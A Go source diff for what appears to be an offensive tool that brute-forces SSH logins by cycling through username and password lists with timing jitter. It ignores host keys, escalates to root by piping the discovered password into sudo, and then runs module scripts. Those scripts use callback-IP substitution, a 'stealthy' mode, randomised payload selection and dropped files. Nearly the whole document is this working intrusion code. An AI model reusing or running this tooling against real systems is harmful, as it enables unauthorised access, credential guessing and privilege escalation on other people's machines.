@@ -74,7 +74,7 @@ func runner(i Instance, m Module, w *sync.WaitGroup) {
 
 
     if c.ConnectionsPerBox == 0 {
-        c.ConnectionsPerBox = len(files)
+        c.ConnectionsPerBox = 3
     }
 
     fileChan := make(chan string)
@@ -110,7 +110,7 @@ func interpret(line string, lineNum int, i Instance, s *Script, m Module) (strin
         strings.Replace(line, "#CALLBACK_IP", callBack, -1)
     }
 
-    if s.Debug {
+    if m.Debug {
         InfoExtra(i, m, *s, lineNum, line)
     }
 
@@ -124,25 +124,19 @@ func interpret(line string, lineNum int, i Instance, s *Script, m Module) (strin
 
         if s.IfState == IF_FALSE {
             if splitLine[0] != "#ELSE" && splitLine[0] != "#ENDIF" {
-                if s.Debug {
+                if m.Debug {
                     Info("Skipping line due to being IF_FALSE:", splitLine)
                 }
                 return "", nil
             }
         }
 
-        if s.Level < m.Level {
+        if s.Level < i.Level {
             // level too low, skip
             return "", errors.New("level below configured value")
         }
 
         switch splitLine[0] {
-            case "#NAME":
-                if len(splitLine) != 2 {
-                    return "", lineError(s, lineNum, line, "malformed name directive")
-                }
-                s.Name = splitLine[1]
-
             case "#LEVEL":
                 if len(splitLine) != 2 {
                     return "", lineError(s, lineNum, line, "malformed level directive")
@@ -153,19 +147,6 @@ func interpret(line string, lineNum int, i Instance, s *Script, m Module) (strin
                 } else {
                     s.Level = lvl
                 }
-            case "#SET":
-                if len(splitLine) < 2 {
-                    return "", lineError(s, lineNum, line, "malformed set")
-                }
-                splitOptions := splitLine[1:]
-                for _, opt := range splitOptions {
-                    switch strings.ToLower(opt) {
-                    case "debug":
-                        s.Debug = true
-                    default:
-                        return "", lineError(s, lineNum, line, "invalid set variable")
-                    }
-                }
             case "#IF":
                 if len(splitLine) != 2 {
                     return "", lineError(s, lineNum, line, "malformed if")
@@ -175,7 +156,7 @@ func interpret(line string, lineNum int, i Instance, s *Script, m Module) (strin
                 }
                 switch strings.ToLower(splitLine[1]) {
                 case "stealthy":
-                    if m.Stealthy {
+                    if i.Stealthy {
                         s.IfState = IF
                     } else {
                         s.IfState = IF_FALSE
@@ -220,17 +201,46 @@ func interpret(line string, lineNum int, i Instance, s *Script, m Module) (strin
                 } else {
                     rand.Seed(time.Now().UTC().UnixNano())
                     rouletteRoll = rand.Intn(rouletteMax)
-                    if s.Debug {
+                    if m.Debug {
                         Info("Roulette roll is", rouletteRoll)
                     }
                 }
 
-                if m.UseRoulette {
-                    s.RouletteState = ROULETTE_WAITING
-                } else {
-                    s.RouletteState = ROULETTE_TRUE
-                }
+                s.RouletteState = ROULETTE_WAITING
                 rouletteCounter = 0
+            case "#ROLL":
+                if len(splitLine) != 2 {
+                    return "", lineError(s, lineNum, line, "malformed roll")
+                }
+
+                if s.RouletteState != NONE {
+                    return "", lineError(s, lineNum, line, "cannot nest roulettes")
+                }
+
+                if rouletteMax, err := strconv.Atoi(splitLine[1]); err != nil {
+                    return "", lineError(s, lineNum, line, "invalid number passed to roll")
+                } else {
+                    if rouletteMax <= 0 {
+                        return "", lineError(s, lineNum, line, "invalid number (too low) passed to roll")
+                    }
+                    rand.Seed(time.Now().UTC().UnixNano())
+                    rouletteRoll = rand.Intn(rouletteMax)
+                    if m.Debug {
+                        Info("Roulette roll is", rouletteRoll)
+                    }
+
+                    if rouletteRoll == 0 {
+                        if m.Debug {
+                            Info("Roll was successful")
+                        }
+                        s.RouletteState = ROULETTE_TRUE
+                    } else {
+                        if m.Debug {
+                            Info("Roll failed")
+                        }
+                        s.RouletteState = ROULETTE_RAN
+                    }
+                }
             case "#ROULETTE":
                 // if it matches, do it
                 if len(splitLine) != 1 {
@@ -239,17 +249,19 @@ func interpret(line string, lineNum int, i Instance, s *Script, m Module) (strin
                 if s.RouletteState == NONE {
                     return "", lineError(s, lineNum, line, "roulette directive without startroulette")
                 } else if s.RouletteState == ROULETTE_TRUE {
-                    if m.UseRoulette {
-                        s.RouletteState = ROULETTE_RAN
-                        if s.Debug {
-                            Info("Roulette has concluded", rouletteRoll)
-                        }
+                    s.RouletteState = ROULETTE_RAN
+                    if m.Debug {
+                        Info("Roulette has concluded", rouletteRoll)
                     }
                 } else if s.RouletteState == ROULETTE_WAITING && rouletteRoll == rouletteCounter {
-                    if s.Debug {
+                    if m.Debug {
                         Info("Roulette is now active")
                     }
                     s.RouletteState = ROULETTE_TRUE
+                } else {
+                    if m.Debug {
+                        Info("Roulette was not chosen, roll was", rouletteRoll, "count is", rouletteCounter)
+                    }
                 }
                 rouletteCounter++
             case "#ENDROULETTE":
@@ -265,7 +277,7 @@ func interpret(line string, lineNum int, i Instance, s *Script, m Module) (strin
                     return "", lineError(s, lineNum, line, "malformed drop")
                 }
 
-                // TODO: insecure file path handling
+                // TODO: fix insecure file path handling
                 filePath := "../" + m.Name + "/drops/" + splitLine[1]
 
                 fileContent, err := os.ReadFile(filePath)
@@ -307,34 +319,66 @@ func interpret(line string, lineNum int, i Instance, s *Script, m Module) (strin
     return "", nil
 }
 
+
+func connect(i Instance) (*ssh.Session, *ssh.Client, int, int, error) {
+    var usernameIndex int
+    var passwordIndex int
+    for {
+        rand.Seed(time.Now().UTC().UnixNano())
+        jitter := rand.Intn(10)
+        time.Sleep(time.Duration(jitter) * 100 * time.Millisecond)
+        // SSH client config
+        Info("[T" + i.Id + "] Trying", i.Username[usernameIndex]  + ":" + i.Password[passwordIndex], "for", i.Ip)
+        config := &ssh.ClientConfig{
+            User: i.Username[usernameIndex],
+            Auth: []ssh.AuthMethod{
+                ssh.Password(i.Password[passwordIndex]),
+            },
+            // We don't care about host keys
+            HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+        }
+
+        // Connect to host
+        client, err := ssh.Dial("tcp", i.Ip+":"+strconv.Itoa(i.Port), config)
+        if err != nil {
+            Info("login failed lol")
+        } else {
+
+            // Create sesssion
+            sess, err := client.NewSession()
+            if err != nil {
+                Info("session creation failed lol")
+            } else {
+                return sess, client, usernameIndex, passwordIndex, nil
+            }
+        }
+
+        if usernameIndex == len(i.Username) - 1 {
+            if passwordIndex == len(i.Password) - 1 {
+                return &ssh.Session{}, client, usernameIndex, passwordIndex, err
+            }
+        }
+        if passwordIndex == len(i.Password) - 1 {
+            usernameIndex++
+            passwordIndex = 0
+        } else {
+            passwordIndex++
+        }
+    }
+
+}
+
 func ssher(fileChan chan string, m Module, i Instance, wg *sync.WaitGroup) {
 
     defer wg.Done()
+    s := Script{}
 
-	// SSH client config
-	config := &ssh.ClientConfig{
-		User: i.Username,
-		Auth: []ssh.AuthMethod{
-			ssh.Password(i.Password),
-		},
-		// We don't care about host keys
-		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-	}
-
-	// Connect to host
-	client, err := ssh.Dial("tcp", i.Ip+":"+strconv.Itoa(i.Port), config)
-	if err != nil {
-		Err(err)
+    sess, client, uIndex, pIndex, err := connect(i)
+    if err != nil {
+        Crit(i, m, s, "Failed to log in for usernames:", i.Username, ", passwords:", i.Password, "(" + err.Error() + ")")
         return
-	}
-	defer client.Close()
-
-	// Create sesssion
-	sess, err := client.NewSession()
-	if err != nil {
-		Err("Failed to create session: ", err)
-        return
-	}
+    }
+    defer client.Close()
 	defer sess.Close()
 
 	// I/O for shell
@@ -361,17 +405,15 @@ func ssher(fileChan chan string, m Module, i Instance, wg *sync.WaitGroup) {
     stdoutOffset := 0
     stderrOffset := 0
 
-    Info("[ ROUTINE", i.Id, "] Connected to", i.Ip)
+    Info("[T" + i.Id + "] Logged in to", i.Ip)
     stdoutOffset = stdoutBytes.Len()
     stderrOffset = stderrBytes.Len()
 
-    s := Script{}
-
-    if i.Username != "root" {
+    if i.Username[uIndex] != "root" {
         // escalate to root
         escalated = true
         time.Sleep(time.Second)
-        fmt.Fprintf(stdin, "echo '%s' | sudo -S whoami\n", i.Password)
+        fmt.Fprintf(stdin, "echo '%s' | sudo -S whoami\n", i.Password[pIndex])
         time.Sleep( 2 * time.Second)
         stderrOffset = stderrBytes.Len()
         fmt.Fprintf(stdin, "sudo -i\n")
@@ -392,6 +434,26 @@ func ssher(fileChan chan string, m Module, i Instance, wg *sync.WaitGroup) {
             return
         }
 
+        s := Script{}
+
+        // TODO improve this file handling
+        // pass os.File from filechan?
+        fileSplit := strings.Split(fileName, "/")
+        s.Name = fileSplit[len(fileSplit)-1][:len(fileSplit[len(fileSplit)-1])-3]
+
+        if len(m.Enabled) > 0 {
+            enabled := false
+            for _, modEn := range m.Enabled {
+                if modEn == s.Name {
+                    enabled = true
+                    break
+                }
+            }
+            if !enabled {
+                continue
+            }
+        }
+
         // read file for module
         file, err := os.Open(fileName)
         if err != nil {
@@ -401,7 +463,6 @@ func ssher(fileChan chan string, m Module, i Instance, wg *sync.WaitGroup) {
 
         scanner := bufio.NewScanner(file)
 
-        s := Script{}
 
         for scanner.Scan() {
             index++
@@ -423,12 +484,12 @@ func ssher(fileChan chan string, m Module, i Instance, wg *sync.WaitGroup) {
                     s.IfState = IF_FALSE
                 } else if cmdResult == 0 {
                     s.IfState = IF
-                    if s.Debug {
+                    if m.Debug {
                         Info("IFCMD passed, cmdResult was", cmdResult)
                     }
                 } else {
                     s.IfState = IF_FALSE
-                    if s.Debug {
+                    if m.Debug {
                         Info("IFCMD failed, cmdResult was", cmdResult)
                     }
                 }
@@ -458,7 +519,7 @@ func ssher(fileChan chan string, m Module, i Instance, wg *sync.WaitGroup) {
             }
 
 
-            if s.Debug {
+            if m.Debug {
                 time.Sleep(1 * time.Second);
                 if stdoutBytes.Len() - stdoutOffset > 0 {
                     Stdout(strings.TrimSpace(stdoutBytes.String()[stdoutOffset:]))
